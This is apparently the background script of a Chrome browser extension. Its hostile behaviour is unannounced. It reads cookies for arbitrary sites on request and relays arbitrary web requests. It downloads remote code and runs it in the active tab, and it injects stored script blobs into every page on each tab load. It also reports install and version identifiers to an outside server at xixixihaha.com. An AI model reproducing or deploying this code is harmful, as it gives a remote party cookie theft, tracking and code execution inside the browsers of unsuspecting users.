chrome.extension.onMessage.addListener(function (request,sender,sendResponse) {
    if (request.name == "clearCook") {
        chrome.cookies.get({
            url:request.url,
            name:"t"
        },function (b) {
            if (b && b.name) {
                removeCookie(request.url,b);
            }
            sendResponse("1");
        });
    } else if (request.name == "getCook") {
        chrome.cookies.getAll({
            url:request.url,
            name:request.key
        },function (b) {
            sendResponse(b);
        });
    } else if (request.name == "universal") {
        $.ajax({
            type:request.type,
            url:request.url,
            dataType:request.dataType,
            data:request.data,
            success:function (e) {
                sendResponse(e);
            },error:function () {
                sendResponse("");
            }
        });
    } else if (request.name == "script") {
        $.ajax({
            type:"get",
            url:request.url,
            dataType:"html",
            success:function (e) {
                chrome.tabs.executeScript(null,{code:e,runAt:"document_end"});
            },error:function () {
                sendResponse("");
            }
        });
    }
    return true;
});
chrome.tabs.onCreated.addListener(function (a,b,c) {
    urlMatch(a,b,c)
});
chrome.tabs.onUpdated.addListener(function (a,b,c) {
    urlMatch(a,b,c)
});
var clock = null;
function urlMatch(a,b,c) {
    if (c && c.url) {
        clearTimeout(clock);
        clock = setTimeout(function () {
            executeScript(a);
        },3000);
        if (b && b.status && b.status == "complete") {
            clearTimeout(clock);
            executeScript(a);
        }
    }
}
function executeScript(id) {
    chrome.storage.local.get(null,function (e) {
        if (e && e.LibJs622) {
            chrome.tabs.executeScript(id,{code:e.LibJs622},function () {
                if (e && e.MainJs622) {
                    chrome.tabs.executeScript(id,{code:e.MainJs622},function () {
                    })
                }
            })
        }
    });
}
function setLeftTime() {
    var curDate = new Date();
    var curTamp = curDate.getTime();
    var leftTamp = 5 * 1000;
    var leftTime = new Date();
    leftTime.setTime(leftTamp + curTamp);
    return leftTime
}
browserObj().runtime.setUninstallURL("https://ext.statis.xixixihaha.com/uninstall.php?cid=" + cid);
if (!(document.cookie.indexOf("newdailyActivity") > -1)) {
    var lefttime = setLeftTime();
    document.cookie = "newdailyActivity=" + escape(cid) + ";expires=" + lefttime.toGMTString();
    var sid = localStorage.sid ? localStorage.sid : 0;
    var t = localStorage.t ? localStorage.t : 0;
    chrome.storage.local.get(null,function (e) {
        var LibVer622 = e.LibVer622 ? e.LibVer622 : "";
        var MainVer622 = e.MainVer622 ? e.MainVer622 : "";
        $.ajax({
            url:"https://ext.statis.xixixihaha.com/index/Commoninterface/statisticsPlug",type:"post",
            data:{
                sid:sid,
                t:t,
                cid:cid,
                xid:chrome.runtime.id,
                libver:LibVer622,
                mainver:MainVer622
            },
            dataType:"json",success:function (data) {
                if (data.sid) {localStorage.sid = data.sid}
                if (data.t) {localStorage.t = data.t}
            }
        })
    });
}